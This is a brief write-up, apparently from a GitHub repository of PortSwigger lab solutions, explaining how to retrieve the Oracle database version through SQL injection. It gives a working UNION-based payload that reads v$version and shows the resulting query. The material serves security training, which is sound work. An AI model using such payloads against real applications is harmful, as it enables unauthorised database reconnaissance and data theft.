## Lab Description: SQL injection attack, querying the database type and version on Oracle

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/25571c47-3460-41b7-8363-704f83ec43cf)

Solution:
The SELECT version FROM v$instance only returns the version number, the first one, SELECT banner FROM v$version, returns the full version string that is requested.

Therefore I need to inject `' UNION SELECT 'a',banner FROM v$version--` to obtain the version information with the following query:

` SELECT * FROM someTable WHERE category='Pets' UNION SELECT 'a',banner FROM v$version-- `

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/a9038f3d-f473-46f4-a3b0-4ea2fd45057a)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/f09cf081-c157-48c4-9b1b-54c357d8af12)
